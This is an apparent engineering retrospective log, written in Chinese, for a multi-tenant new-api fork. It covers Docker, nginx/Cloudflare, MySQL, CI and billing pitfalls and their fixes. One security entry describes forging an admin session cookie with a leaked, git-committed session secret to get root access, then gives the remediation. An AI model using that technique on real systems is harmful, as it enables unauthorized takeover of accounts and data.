# 工程复盘日志 (RETRO.md)

> **用途**：记录开发过程中反复出现的错误、vibe coding 中遇到的典型困难、以及解决方案。
> 当类似问题再次出现时，先来这里查询，避免重复踩坑。

## 维护规则

1. 每条记录必须包含：**现象、根因、是否已解决、解决方案（或规避方式）**。
2. 未解决的问题必须标注 `[未解决]`，已解决的标注 `[已解决]`。
3. 新条目**追加在对应分类末尾**，不要打乱已有顺序。
4. 如果某条经验已经固化为 `CLAUDE.md` 的硬约束或棘轮条目，在此标注 **"已升级为规则"** 并注明位置（如 `→ CLAUDE.md C3`）。

> **条目模板**（复制到对应分类末尾使用）：
>
> ```markdown
> ### [已解决|未解决] <一句话标题>
> - **现象**：<观察到的报错/异常表现>
> - **根因**：<真正的原因>
> - **解决/规避**：<怎么修的，或暂时怎么绕开>
> - **升级**：<是否升级为规则；如已升级，注明位置，如 → CLAUDE.md C3 / 工作纪律 W4>
> ```

---

## 一、部署与环境

> Docker / Docker Compose / Nginx / MySQL / 网络 / 环境变量 / 证书等部署侧的坑。

### [已解决] 本机 rsync 在沙箱 PATH 下不可用 → 用 tar-over-ssh 上传
- **现象**：`rsync ... root@server:/root/newapi-test/` 报 `rsync: command not found`（虽然 `command -v rsync` 能查到 /usr/bin/rsync，但直接调用在沙箱 exec 下失败）。
- **根因**：沙箱化 Bash 的 PATH/exec 与登录 shell 不一致，rsync 不稳定。
- **解决/规避**：改用 `tar czf - --exclude=... -C <repo> . | ssh newapi628 'tar xzf - -C /root/newapi-test'`，零额外依赖、稳定可用。tar 的 macOS xattr 告警（`LIBARCHIVE.xattr.com.apple.*`）无害可忽略。
- **升级**：已写入部署脚本约定（`scripts/preflight.sh` 之后用 tar-over-ssh）；后续 Slice 部署沿用。

### [已解决] mysql:8.2 首启未就绪 → app 连接重试
- **现象**：app 启动时 mysql 容器尚在初始化，`dial tcp ...:3306: connection refused`（约 7 次）。
- **根因**：`depends_on` 只保证启动顺序、不等就绪；mysql 首次初始化需 ~15s。
- **解决/规避**：app 侧 `gorm.Open`+`Ping` 重试 30×2s；compose `restart: on-failure` 兜底；root 用 `--default-authentication-plugin=mysql_native_password` 规避非 TLS 公钥交换。**已验证**：重试后连上→迁移→seed→listening。

### [已解决] Cloudflare 代理域名报 521（源站无 443）
- **现象**：`tokendream.wedreamhub.com`（CF 橙云代理）经 CF 访问报 `error code: 521`，但源站 `curl -H Host:... http://127.0.0.1/healthz` 正常。
- **根因**：CF 该域 SSL 模式为 **Full**，CF→源站走 **443**，而宝塔 nginx 只监听 80（现网 `api.wedreamhub.com` 也是 80-only，应为 DNS-only 或 Flexible）→ CF 连源站 443 被拒 → 521。
- **解决/规避**：源站侧自治修复——给 `tokendream` vhost 加 `listen 443 ssl` + **自签证书**（CF Full 不校验源站证书），同时保留 80（兼容 Flexible）。无需改 CF 面板。**已验证**：CF 全链路 healthz/品牌/钱包均 200。
- **升级**：测试栈单域名用自签即可；正式上线 `*.wedreamhub.com` 通配建议用 CF Origin CA 证书（Full strict）或宝塔 Let's Encrypt。`scripts/` 可加 vhost 模板。

### [已解决] 未注册子域 / 野域名指向平台 IP 会看到主站控制台（主站兜底过宽）
- **现象**：任意 `foo.wedreamhub.com`（未建租户）或把野域名 A 记录指向平台 IP 命中通配 vhost 时，后端解析无租户 → 前端 `getTenantCurrent` 返 null → **回落渲染主站**。用户担心"改个 DNS 就能到主站"。
- **根因**：`/api/tenant/current` 对"无租户命中"只有一种响应（`TENANT_NOT_FOUND`），前端把它一律当主站（no-op）。"主站兜底"覆盖了 www 之外的所有未知子域，语义过宽。
- **解决/规避**：改「无租户命中」为**三态**——新增 `tenant.IsMainSiteHost(host)`（apex+www+非平台域→主站；`*.wedreamhub.com` 下未注册子域→false）+ 错误码 `SITE_NOT_ACTIVATED`；`HandleTenantCurrent` 据此分返；前端 `resolveTenant()` 用 `getApiErrorCode` 区分，`__root.tsx` 命中 `not-activated` 渲染全屏「站点未开通」页替代 Outlet。apex 由 `deploy/nginx/apex-redirect.wedreamhub.com.conf` 301→www。**www=主站、其余子域=代理空间、agentdemo 等已注册租户零改动**。（本机无 Go 工具链，后端 `go build`/`go test ./internal/tenant/` **待服务器验证**；前端 `node_modules` 未装，typecheck 一并在服务器跑。）
- **升级**：主站 Host 严格限 www/apex（+ localhost/IP 直连兜底）；新增"无租户命中"分支时必须走 `IsMainSiteHost` 区分，不得再无条件回落主站。设计落地见 `doc/domains-ssl.md §6.4`。

### [已解决] 长镜像构建期 SSH 连接被远端关闭（构建仍完成）
- **现象**：`ssh ... 'docker compose up -d --build'` 在构建中途返回 `exit 255 / Connection closed by remote host`。
- **根因**：构建（go+node 多阶段）+ 运行容器同时占用，输出流式传输期间 SSH 会话被远端断开（资源瞬时压力/网络抖动）；但 `docker compose up -d --build` 的构建是在服务器侧进行，**断的是 ssh 输出流、不是构建本身**。
- **解决/规避**：重连后 `docker compose ps`/`docker images`/`docker logs` 核实——镜像已重建、容器已 healthy、seed 已跑。**构建实际完成**。
- **升级**：后续长构建可改 `ssh newapi628 'cd ... && nohup docker compose ... up -d --build > /tmp/build.log 2>&1 &'` 后轮询 `build.log`，避免 ssh 断流误判；或先 `docker compose build` 再 `up -d`。

### [已解决] compose 未加载 `.env`（上游 Key 注入为空）
- **现象**：app 启动 compose 警告 `The "UPSTREAM_API_KEY" variable is not set. Defaulting to a blank string.`，上游调用因无 Key 失败。
- **根因**：`docker compose -f deploy/docker-compose.test.yml ...` 默认从 **compose 文件所在目录**（`deploy/`）找 `.env`，而我把 `.env` 放在了项目根 `/root/newapi-test/.env`（cwd），未被加载。
- **解决/规避**：部署命令显式 `--env-file /root/newapi-test/.env`：`docker compose -p newapi_test --env-file /root/newapi-test/.env -f deploy/docker-compose.test.yml up -d`。**已验证**：上游 env 注入、`/v1` 真实调用、双桶扣费全通。
- **升级**：部署脚本固定带 `--env-file`；上游 Key 仅存服务器 `.env`(600)，仓库只引用 `${UPSTREAM_API_KEY}`，并在上传前 `grep` 确认无明文 Key（已纳入预上传检查）。

### [已解决] 我们的表名与 new-api 原生表撞车（user_subscriptions）
- **现象**：目标③ 桥接原生订阅时，我们的 tokenplan 订阅表与 new-api 原生 `model.UserSubscription` **都映射物理表 `user_subscriptions`**。原生先迁移后，我们 `AutoMigrate` 给它加 `source_order_id NOT NULL UNIQUE` → MySQL 报 `Cannot add a UNIQUE column` 或合出"被污染"的表（原生 INSERT 撞空串 unique 索引而失败）。前端/计费此前没炸，仅因从没真插过订阅（0 行）。
- **根因**：复用原生计费=原生必须独占 `user_subscriptions`（`PreConsume/HasActive` 查它），我们的表不能同名。
- **解决/规避**：我们的表 **改名 `user_subscriptions`→`tokenplan_subscriptions`**（`internal/tokenplan/gormrepo` `TableName()`）。**已有库的清理（W4）**：服务器上那张被污染的 `user_subscriptions`（0 原生数据）→ `DROP TABLE user_subscriptions` → 重启 app，原生 `InitDB` 重建干净表（已在测试栈执行验证：重建后无 `source_order_id` 列、原生订阅 INSERT 成功）。
- **升级**：**新增任何 GORM 表前，先 grep new-api `model/` 确认表名不撞**（尤其 user/token/subscription/channel/log 等高频名）；与原生共存的功能优先复用原生表，不另建同名表。文档 `user_subscriptions`→`tokenplan_subscriptions` 待同步（proposal §6.19、internal/stats 注释，W5）。

### [已解决] `.gitignore` 裸目录名 glob 静默吞掉新增源文件
- **现象**：新增买家路由 `web/default/src/routes/_authenticated/plans/index.tsx` 本地能构建进 bundle、页面正常，但 `.gitignore` 第 25 行裸写 `plans`（本意忽略根级脚本目录）会**匹配任意层级**名为 `plans` 的路径 → `git add` 静默跳过该文件，提交后路由会丢。前端 Worker 用 `git check-ignore -v` 发现。
- **解决/规避**：裸 `plans` 锚定为 `/plans`（只忽略根级）；提交前 `git diff --cached --name-only | grep` 确认关键新文件已暂存。
- **升级**：新增源文件后（尤其路径含常见词 plans/cache/dist），**提交前 `git check-ignore` 抽查**；`.gitignore` 规则尽量锚定 `/`。

### [已解决] new-api 内嵌双前端：我们的页面在 default 主题，但默认服务 classic
- **现象**：5a/6a 都对，admin API 返回 6 档套餐，但 `https://tokendream...` 左侧栏**无「套餐管理」**、`/token-plans` 空白。排查良久（怀疑构建缓存/路由/sidebar 过滤），`docker build --no-cache` 重建也不出。
- **根因**：new-api **同时内嵌两套前端** `web/default`(新版 shadcn/TanStack) + `web/classic`(经典 Semi-UI)，`main.go` 按系统选项 **`theme.frontend`** 选择服务哪个，**默认 `classic`**（`common/constants.go`、`setting/system_setting/theme.go`）。我们所有 Phase 2 前端工作都在 `web/default`——但线上服务的是 classic（它没有 token-plans），所以页面/菜单永远不出现。前端 Worker 本地 `bun run build` + grep `web/default/dist` 证明 token-plans **确实在 default 产物里**（`tp-admin-page` 在 `async/3674*.js`）→ 锁定是"服务的主题不对"，非代码 bug。
- **解决/规避**：`PUT /api/option {key:"theme.frontend",value:"default"}`（admin cookie + `New-Api-User` 头；值仅 default/classic）→ 立即生效、无需重建（两套 dist 已内嵌）。playwright 验证：登录后侧栏「套餐管理」✅、`/token-plans` 渲染 6 档套餐 ✅。
- **升级**：**部署后必须把 `theme.frontend` 设为 `default`**（否则服务经典前端、看不到我们的页面）——已记为部署步骤；可在 `mtwire` seed 里幂等设置以免 fresh DB 回退 classic。改前端找不到效果时，**先确认服务的是哪套主题**。

### [已解决] macOS tar 带进 `._*` AppleDouble 垃圾文件
- **现象**：`tar -C mac . | ssh 'tar x'` 上传后，服务器 `src/routes/.../` 出现 `._index.tsx` 等垃圾文件（macOS 扩展属性/资源叉），可能干扰前端路由扫描/构建。
- **解决/规避**：服务器 `find /root/newapi-test -name '._*' -delete`；后续 Mac 打包加 **`COPYFILE_DISABLE=1 tar ...`**（或 `--no-mac-metadata`）避免生成。
- **升级**：上传命令固定带 `COPYFILE_DISABLE=1`，纳入部署脚本。

### [已解决] P1-BASE-02 渠道/relay 跑通 —— 4 个连环坑（建渠道 panic / 双 /v1 / 模型价 / 钩子挂错函数）
- **① 建渠道 panic**：`POST /api/channel/` 用扁平 payload(`{name,type,key,...}`)→ `AddChannelRequest.Channel`(嵌套 `*model.Channel`,`json:"channel"`) 为 nil → `validateChannel(nil)` 在 `ValidateSettings`(model/channel.go:942) nil deref。**非 fork bug**。**修**：payload 必须 `{"mode":"single","channel":{...}}`（新版前端就是这么发的）。
- **② base_url 双 `/v1`**：channel base 填 `…codexapis.com/v1`，new-api 自动追加 `/v1/chat/completions` → `/v1/v1/...` Invalid URL。**修**：base_url 只到域名根 `https://www.codexapis.com`（去 /v1）。
- **③ 模型价未配**：`模型 gpt-5.4-mini 的价格未配置`。**修**：`PUT /api/option {key:"ModelRatio",value:"{\"gpt-5.4-mini\":1}"}`（保留计费，**不用自用模式**，否则不扣费无法验倍率）。
- **④ consume_commission 不触发**：钩子挂 `service/quota.go PostConsumeQuota`，但**文本中继结算实际走 `service/text_quota.go PostTextConsumeQuota`**（前者文本路径根本不调）。**修**：在 `PostTextConsumeQuota` 的 `RecordConsumeLog` 后也挂钩（幂等键 RequestId，两处共存不双计）。
- **验证**：/v1 真实调 gpt-5.4-mini 通；用户组倍率 override 3.0 → 计费 **3.02×**（消费日志 `group_ratio:3` vs 关闭后 `group_ratio:1`）；consume_commission demoagent 得 ¥0.0085（`consume:wallet`）；双桶（admin=订阅桶 `billing_source:subscription`/chanuser1=钱包桶 `wallet`）日志确认。
- **升级**：①建渠道/改价的正确 payload 记此（嵌套 `channel`、base_url 去 /v1、ModelRatio 配价）；②**新增 relay 旁路钩子必须确认挂在文本结算 `PostTextConsumeQuota`，不是 `PostConsumeQuota`**。

### [已解决] 通配 443 vhost 劫持「只 listen 80」的现网 vhost 的 HTTPS（差点静默打挂现网 api）
- **现象**：加 `*.wedreamhub.com` 通配 443 vhost(→3100) 后，现网 `api.wedreamhub.com` 经 CF 的 HTTPS **被劫持到我们新栈 3100**（`/api/tenant/current` 返我们的 `TENANT_NOT_FOUND`、`/api/status` start_time = 新栈）。差点以为"现网未受影响"（curl 不带正确 SNI 时 200 误判）。
- **根因**：宝塔 api vhost **只 `listen 80`**；CF SSL=Full → 经 **443** 回源；api:443 无精确匹配 → 落到通配 vhost → 转 3100。nginx **精确 server_name 优先于通配**，但前提是存在精确的 443 server。
- **解决**：新增**精确 `server_name api.wedreamhub.com; listen 443 ssl` vhost → 现网 3000**（`deploy/nginx/api-443-to-origin.wedreamhub.com.conf`，证书复用通配 Origin CA、`Host 127.0.0.1` 镜像现网反代）。验证（**必须带正确 SNI**，`curl --resolve` 或经 CF）：api→3000(start_time 现网)、tokendream/子域→3100。
- **升级**：**加通配 443 vhost 后，必须为所有"只 listen 80"的现网精确域名补一条精确 443 vhost 指回其后端**，并用 `curl --resolve <域名>:443:IP`（带 SNI）逐一核验路由——`curl -H Host` 不设 SNI 会误判。属 C1「不碰现网」红线的隐性陷阱。

### [已解决] 自定义域名证书：宝塔接管 Nginx 下用「每域名独立 vhost + 不声明 default_server」零冲突共存
- **现象**：要让任意代理自定义域名（A 记录直指主站 IP）反代到多租户栈 3100 并签 LE 证书，但宝塔接管了 Nginx（`/www/server/panel/vhost/nginx/`，主配 `include *.conf`），盲目加 `default_server` 会与宝塔 `0.default.conf` 抢每端口唯一的 default 槽位。
- **根因**：nginx 每个 `listen` 端口只允许一个 `default_server`；但**精确 `server_name` 匹配优先于 default**（同 §一 通配劫持那条的反向利用）。自定义域名是具体主机名，天然可被精确 server 块命中，无需 default。
- **解决/规避**：`scripts/issue-cert.sh` 为每个域名写 `custom_<域名>.conf` 到宝塔 vhost 目录（被主配 `include *.conf` 自动加载），**不声明 default_server**；HTTP-01 走共享 webroot `/www/wwwroot/acme-challenge`，签发前先写「仅 80」vhost+reload 让 challenge 可达，装证后再写「80→443」完整 vhost。`Host $host` 透传供后端按 Host 解析租户。**红线**：只反代 127.0.0.1:3100，绝不碰现网 3000。已 E2E（绑定→TXT→active→解析→品牌→解绑）全绿；真实 LE 签发需代理提供可控域名（A 直连、勿套 CF 代理，否则 HTTP-01 取不到）。
- **升级**：宝塔下加自定义反代一律走「手写精确 server_name vhost + 不碰 default + 勿在面板编辑这些站点」。已写入 `doc/domains-ssl.md` §6.5 / `scripts/README.md`。

### [已解决] 服务器磁盘被 Docker build cache 撑满（每次 `--build` 累积，81% → prune 后 25%）
- **现象**：`df -h /` 用到 81%（76G/99G，仅剩 19G）；`docker system df` 显示 **Build Cache 56.5GB，其中 55.7GB reclaimable**（占满半块盘），Images 另有 4.7GB reclaimable（旧 `prev-*` 回滚 tag + dangling）。磁盘逼近满，后续 `--build` 有失败风险。
- **根因**：每次 `docker compose … up -d --build` 都往 BuildKit build cache 累积层；多轮部署后无人清理 → cache 无上限膨胀。与运行镜像/容器/DB **无关**，纯构建副产物堆积。
- **解决/规避**：`docker builder prune -f`（只删构建缓存，下次构建自动重生、仅慢一次；**不碰**镜像/容器/volume/DB）→ 一次回收 55.7GB；`docker image prune -f` 只删 dangling（保留 `prev-*` 回滚 tag）再回收 0.35GB。**81% → 25%（71G free）**。go mod/build 的**命名 volume**（newapi_gomodcache 等）是提速用的、`builder prune` 不动它们，放心。
- **升级**：**每隔若干次部署、或见 `df` 逼近 80% 就 `docker builder prune -f`**——安全的例行维护，别等构建因 no space 失败才处理；判断看 `docker system df` 的 Build Cache RECLAIMABLE 列。（`/root/newapi-test-old-*`、`/root/newapi-compile` 等 /root 旧源码副本另占 ~5.7G，属人工备份，删前问用户。）

### [已解决] MySQL 不支持 `CREATE INDEX IF NOT EXISTS`——sqlite 单测过、MySQL 迁移报 Error 1064
- **现象**：breakage 监控部署到测试栈后，迁移日志 `Error 1064 (42000): You have an error in your SQL syntax ... near 'IF NOT EXISTS idx_breakage_snap_tenant_period ON breakage_snapshots ...'`（`gormrepo.go` ensureIndex）。本机全部单测（`glebarez/sqlite` :memory:）却是全绿。
- **根因**：**MySQL（含 8.x）不支持 `CREATE INDEX IF NOT EXISTS`**（仅 MariaDB 10.1.4+/pg/sqlite 支持；agent 写的注释「MySQL 8.0.13+ 支持」是错的，把 MySQL 当 MariaDB）。sqlite 支持该语法 → 单测测不到；生产 MySQL 才炸。**这是 sqlite测试→MySQL生产的系统性方言盲区**：凡「只在 MySQL 跑的原生 SQL」单测都覆盖不到。代码已 best-effort 吞错、不阻断迁移，故功能没坏，但 perf 索引没建上 + 每次迁移刷错误日志。
- **解决/规避**：照 `internal/report/reportrepo/migrate.go` 已在生产 MySQL 验证的方言分支：MySQL 先查 `information_schema.statistics` 判索引存在、缺失才 `CREATE INDEX`（**无** IF NOT EXISTS）；sqlite/pg 用原生 IF NOT EXISTS。`dbType` 取 `common.MainDatabaseType()`（sqlite 单测未设 → "" → 走 IF NOT EXISTS 分支，不受影响）。修后重新部署，两索引（唯一键 + tenant_period）均建成、日志无 1064。
- **升级**：补 `AutoMigrate` 不自动建的组合/perf 索引，一律用方言分支 `ensureIndex(db, common.MainDatabaseType(), ...)`；**别用 `CREATE INDEX IF NOT EXISTS`（MySQL 会炸）**。凡涉及只跑 MySQL 的原生 SQL，sqlite 单测过不代表生产过——必上服务器容器验证。已存记忆 [[mysql-create-index-if-not-exists]]。

### [已解决] 计费吞吐卡 ~95rps / CPU 75% 空闲——根因是 MySQL per-commit fsync 天花板，非 app 逻辑
- **现象**：文本请求吞吐卡 ~95rps（单用户 ~31rps）、~30ms 计费尾延迟，但 CPU 仅 75% 占用（≈25% 空闲）→ 非硬件瓶颈。初判为「计费未批量：每请求同步写 users/tokens/channels + logs INSERT，各独立事务各触发 fsync」。
- **根因**：MySQL 默认 `innodb_flush_log_at_trx_commit=1` + `sync_binlog=1`（本栈 `log_bin=ON`）→ **每次 commit 都要 fsync（redo，且开了 binlog 再来一次）**，单盘 fsync 延迟把提交吞吐钉死。实测：scratch 表单连接串行单行提交仅 **523 commits/s**、~1.19 fsync/commit。聚合 ~95rps × 每请求约 5 次 commit（钱包 4 UPDATE+1 log，或订阅桶 1 FOR UPDATE 事务+1 log）≈ 475 commits/s，**正好顶到 523 天花板**——CPU 在等磁盘 fsync 返回，故空闲。
- **解决/规避**：**先量后改（optimize-measure）**。DB 杠杆（零代码/零停机/可秒回退，覆盖钱包/订阅桶/日志三条同步路径）：`SET GLOBAL` 即时生效 + `SET PERSIST innodb_flush_log_at_trx_commit=2; sync_binlog=0`（写入数据卷 `mysqld-auto.cnf`，重启/recreate 保留）+ `deploy/docker-compose.test.yml` mysql `command:` 兜底（全新卷）。同基准复测 **523→5763 commits/s（11×）**，fsync/commit 1.19→0.076。durability：进程崩溃不丢已提交扣费，仅宿主机断电丢 ≤1s（用户拍板可接受）。第二杠杆 app 层 batch-update（`BATCH_UPDATE_ENABLED`，机制早在 `model/utils.go` 只是默认关）已 staged 待低峰重启激活，用于消除 `channels.used_quota` 热行锁竞争（非 fsync）；安全前提=Redis 为额度权威（`cacheDecr*` 同步扣 Redis）故 DB 列滞后不超扣。
- **坑点**：① 症状「CPU 空闲 + 吞吐卡 + 尾延迟」= 典型 **fsync-bound**（等盘），别往 app 算法上找。② 诊断用 **scratch 表 `SET PERSIST`+存储过程 loop 提交** 隔离 fsync 天花板，零上游成本/零真实数据变更/可精确复测，胜过在生产压测（费真实 token + 扰动用户）。③ MySQL 8 用 `SET PERSIST` 持久化动态变量（写 `mysqld-auto.cnf`，落在挂载卷）——比改 compose `command` 免 recreate mysql。
- **升级**：暂不升级为硬约束（属调优而非红线）。记忆 [[billing-fsync-tuning-and-batch]]；相关 [[used-usd-dead-column-real-usage-native-bucket]]。

### [已解决] 生产会话/加密根密钥被内联成 compose 里的 git 字面量（Critical，免密全站 root）
- **现象**：`deploy/docker-compose.test.yml:17`（**这就是生产部署文件**）写了 `SESSION_SECRET: "${SESSION_SECRET:-4329de40…（48 hex）}"`，注释却自称「仅供测试，勿用于生产」。服务器 `/root/newapi-test/.env` 未设 `SESSION_SECRET` → compose 插值**回落到 git 里的字面量**；`CRYPTO_SECRET` 全程未设 → `common/init.go:59-62` 再回落 `CryptoSecret = SessionSecret`。线上只读比对坐实：git 内联默认值与容器 `newapi_test-app-1` 实际在用值 `sha256[0:16]` 均为 `eb1c24ec27668b88`，**逐字节相同**；`git log -S` 仅 2 条（`fd17844` 引入 / `493b830`）→ **从未轮换**。
- **根因**：`${VAR:-默认}` 的「默认」写死在受 git 跟踪的文件里 = 把根密钥提交进代码库。同一把密钥既做 `main.go:191` `cookie.NewStore` 的会话签名、又做 `common/crypto.go:18` 的 HMAC。消费链：`controller/user.go:138-142` 把 `id/role/status` 明文塞进 session → `middleware/auth.go:39-42` 原样取回信任（`RoleRootUser=100`）。**真实失败场景**：任一有仓库读权限者（或流出的克隆 / 被翻出的 `repomix-output.xml`）读到该行 → 本地用 `gorilla/securecookie` 以此密钥签一个 `{"id":1,"role":100,"status":1}` cookie → 带 `New-Api-User:1` 请求 `https://www.wedreamhub.com/api/user/` → `auth.go:132` 的 `role<minRole` 通过 → **免密全站 root（改支付凭据、审批提现、读全租户财务），且日志与正常管理员登录无任何区别**（无登录事件、无异常 IP）。是私有仓库（匿名 404），故非「全网可读」，但「密钥进代码/产物」本身即 Critical。
- **解决/规避**（纯静态修复，本机改代码、轮换+部署在服务器）：
  1. `docker-compose.test.yml` 去掉内联默认，改 **fail-closed** `:?`——未在服务器 `.env` 提供则 compose **直接报错拒绝 `up`**，把「覆盖只是约定」升级为「强制」；同时**拆两把**：新增 `CRYPTO_SECRET: "${CRYPTO_SECRET:?…}"`，让签 cookie 与做 HMAC 用不同密钥（分权，`init.go` 的 `CryptoSecret=SessionSecret` 回落分支在本栈永不再触发）。
  2. `git rm --cached repomix-output.xml`——19.8MB 生成物早在 `.gitignore:75` 却仍被跟踪（提交在先），是泄漏值的**第二份拷贝**；`git grep` 已确认真值现已从**全部 tracked 文件的索引**消失。（其余 `.env.example`/`deploy/.env.test.example`/`docker-compose.yml` 只是 `random_string` 占位，无真值。）
  3. **服务器侧轮换（外部前置，务必先做，否则本次改动会让 `up` 直接失败）**：在 `/root/newapi-test/.env` 追加**两把互不相同**的**全新**随机值 `SESSION_SECRET=$(openssl rand -hex 32)`、`CRYPTO_SECRET=$(openssl rand -hex 32)`（禁止再用旧字面量），再 `docker compose -p newapi_test --env-file /root/newapi-test/.env -f deploy/docker-compose.test.yml up -d app` 重启激活。轮换代价：旧会话 cookie 全失效（用户需重登）、`token_cache`/`file_service` 缓存键重算（**仅缓存 miss，无持久化数据损失**——已核实 `CryptoSecret` 仅用于派生缓存 key，未参与任何入库/比对）。
  4. 轮换后旧值即成**死字符串**，故遗留在 git 历史（`fd17844`/`493b830`）无害；如需彻底洁净可后续 BFG 洗历史（非必须、非阻塞）。
- **升级**：**已升级为规则 → CLAUDE.md C1**（禁止把任何密钥/凭据的字面量写进受 git 跟踪的文件；密钥只存服务器 `.env`(600)，仓库仅 `${VAR}` 引用且用 `:?` fail-closed）。相关既有纪律：[[deployment.md §.env]]、W4（密钥不入库）。

---

## 二、构建与依赖

> Go 编译、Node 前端构建、版本不兼容、依赖拉取、缓存等构建侧的坑。

### [已解决] golangci-lint 未装于 Mac，质量门降级
- **现象**：Mac 本机无 `golangci-lint`，prompt.md 约定的 Go 静态检查门无法原样执行。
- **根因**：本机未安装，且为保持 Worker 离线、零外部依赖（纯标准库单测），不临时安装。
- **解决/规避**：质量门降级为 `go build` + `go vet` + `gofmt -l` + `go test -race -cover`（均内置、离线可用）；集成阶段在服务器/CI 安装 `golangci-lint` 补强。
- **升级**：CI 已于 2026-07-09 落地（`.github/workflows/ci.yml`，跑 go build/vet/test -race + 前端 bun test/build，见本节末「CI 只剩反灌水 bot」条）；但 **golangci-lint 仍未纳入 CI**，本条的静态检查门禁仍待后续补 `golangci-lint-action`。

### [已解决] Phase 2 · A 全量 fork：合并 new-api 基座的要点
- **现象/任务**：把仓库变成 `QuantumNous/new-api` fork，并入我们的 `internal/`。
- **要点/坑**：① new-api **无 `internal/` 目录**，我们的不冲突，直接铺入并 rename 模块前缀 `newapi-mt/internal → github.com/QuantumNous/new-api/internal`（77 文件）。② new-api 用 `gorm v1.25.2`/`gin v1.9.1`（低于我们曾用的 v1.31/v1.12），但我们 `internal/` 仅用 gorm 基础 API、不 import gin，故向下兼容（已 `go build ./internal/...` 验证）。③ **本地无法整库编译**：根 `main.go` `//go:embed web/default/dist`，dist 未构建则 build 失败——`go mod tidy`/整库构建一律在服务器 Dockerfile 内（bun 构建前端 dist 后）完成。④ new-api 前端 **bun** 构建（default+classic 双前端），实测很快（整镜像 ~分钟级，319MB）。
- **解决/规避**：在分支 `phase2-newapi-fork` 做（main 留 Slices 1–4）；机械合并交 Worker、服务器 Docker 构建+部署交 Master；fork 基座已在测试栈跑通。
- **升级**：Phase 2 后续 5a/6a 在此 fork 上做；正式栈关系/前端切换见 `doc/tasks/phase2.md`。

### [已解决] 后端逻辑层先行、不先 fork new-api
- **现象**：prompt.md Wave 0 写"先 fork new-api"，但实际先把 14 个新模块按独立 Go 包 + 接口 mock 实现并单测，未先 fork。
- **根因**：详设采用"消费者定义接口 + 增量为主"，新模块逻辑层不依赖 new-api 源码即可 100% 单测；先 fork 反而拖慢、引入编译噪声。
- **解决/规避**：逻辑层 standalone 先行（已全绿），new-api fork 合并下沉到集成阶段（GORM/Redis/handler/装配一起做）。
- **升级**：已写入 progress.md「集成层待办」；基线源 = `github.com/QuantumNous/new-api`（见 CLAUDE.md）。

### [已解决] 真实微信/支付宝接入：本机无 Go 工具链 + 微信回调路径不一致
- **现象**：① 接 `wechatpay-go`/`smartwalle/alipay/v3` 写 `auth-service/realpay/*` 后，本机 `go`/`go.exe` 均不在 PATH，无法本地 `go build`/`go test` 验证。② `internal/payment/model.go` 的 `ProviderWxpay.NotifyPath()` 返回 `/pay/wxpay/notify`，但 auth-service mux 与 nginx 只注册了 `/auth/wxpay/notify` —— mock 模式不暴露（确认页内部合成回调），真实微信回调会 404。
- **根因**：① 本项目唯一环境是服务器（W4），Mac/本机只编辑调试。② mock 链路从不真正经过 `notify_url`，故路径笔误一直未被发现。
- **解决/规避**：① 把验签/解密（依赖 SDK）与「解析+商户校验+金额换算」（纯函数 `wxTransactionToInfo`/`aliNotificationToInfo`）拆开，对纯函数写可离线编译的单测；真实 crypto 留服务器沙箱 E2E。`go.mod` 加 require，服务器 `go mod tidy && go build ./... && go test` 验证。② auth-service mux 增注册 `POST /pay/wxpay/notify`，nginx `tokendream` vhost 增 `^~ /pay/` 反代到 auth-service（与 `^~ /auth/` 同）。③ `smartwalle/alipay/v3` 的 `TradePagePay`/`TradeQuery` 随版本演进，代码内以 `NOTE(W4)` 标注，服务器构建时核对签名。
- **升级**：暂不升级为硬约束；"真实支付接入需服务器构建验证 + 核对 alipay v3 签名" 已写入 `docs/vendor/payments/deploy-real-payments.md`（上线指南）。

### [已解决] CI 只剩反灌水 bot、不跑任何测试 + preflight 前端步用错包管理器（audit #10）
- **现象**：仓库有 176 个 `*_test.go`（1167 个 `func Test`）+ 5 个前端测试，但 7 个 GitHub workflow 里唯一的 PR 门是 `peakoss/anti-slop`（反 AI 灌水 bot，且只在 opened/reopened 触发、连 synchronize 都不含）；docker/release/nightly 等全是上游继承的构建推镜像，`grep 'go test|vitest|go vet' .github/workflows/` **零命中**。质量门只剩本地 deploy 时的 `scripts/preflight.sh`，还留了 `SKIP_PREFLIGHT=1` 逃生口（`deploy/ops/deploy.sh:51`）。且 preflight 前端步 `pnpm install && pnpm build` **用错包管理器**——项目真源是 `web/bun.lock`（无 pnpm-lock），且 `pnpm build` 在 workspace 根跑（根 `package.json` 无 build 脚本），前端预检形同虚设、还从不跑前端测试。
- **根因**：7 个 workflow 全是上游 new-api 继承来的（构建/发布向），从没人加"跑测试"的 PR 门；本地 preflight 是唯一门却能被 `SKIP_PREFLIGHT=1` 绕过，且它的前端步本身就是坏的（pnpm≠bun、build 目录错、无 test）。
- **解决/规避**：① 新增 `.github/workflows/ci.yml`（`push[main]` + `pull_request`）——backend job 跑 `gofmt(internal)→go build→go vet→go test ./... -race`（即 preflight 的 Go 序列），frontend job 跑 `bun install --frozen-lockfile → bun test → bun run build`；`setup-go` 用 `go-version-file: go.mod` 单一真源，`concurrency` 取消旧 run。② 修 `preflight.sh`：前端步 pnpm→bun、补 `bun test`、gofmt 目标 `cmd internal`→`internal`（cmd/ 已随 fork 基线合并移除），使本地 preflight 与云端 CI **完全对齐**。本地实测全绿：`bun install`(1611 包)/`bun test`(79 pass 0 fail)/`bun run build`(产出 dist)；Go 侧确认无需 MySQL/Redis（`glebarez/sqlite` 内存库，外部库测试被 `TEST_MYSQL_DSN`+`t.Skip` 挡住；`clickhouse_log_test.go` 的 `tcp(localhost:3306)` 只是 DSN 解析测试字符串），go.mod 无 `replace`/无 `vendor/`。③ **首次 CI 实跑（push→main，run 28998511372）即验证有效**：frontend 绿；backend 的 gofmt 步揪出 committed `internal/` **13 个历史未格式化文件**（preflight 是 pre-deploy 门、非 pre-commit，加 `SKIP_PREFLIGHT` 逃生口 → 未格式化代码一路进库、build/test 照过不误）。其中 3 个正被并行 WIP 占用、不能此刻干净 `gofmt -w` → 遂把 gofmt（CI+preflight）**暂改仅告警**（`::warning::` 仍列欠账文件），让 build/vet/test 成为实际门；待 WIP 落地后 `gofmt -w internal` 清账再改回 `exit 1` 阻断。
- **升级**：**建议升级为硬约束（待用户确认填入 CLAUDE.md C 表）**——"测试必须在 CI 跑，`SKIP_PREFLIGHT=1` 只是本地便利、非唯一门"。注意：CI 文件需 commit + push 到 GitHub 才生效；本轮已推 origin/main、GitHub runner 首跑（frontend 绿、backend 待 gofmt 软化后复跑 build/vet/test）。**遗留 TODO**：清 `internal/` 13 个未格式化欠账、gofmt 改回阻断。

### [已解决] 前端 5 个测试混用 node:test 与 vitest 两种写法——仅 `bun test` 能统跑
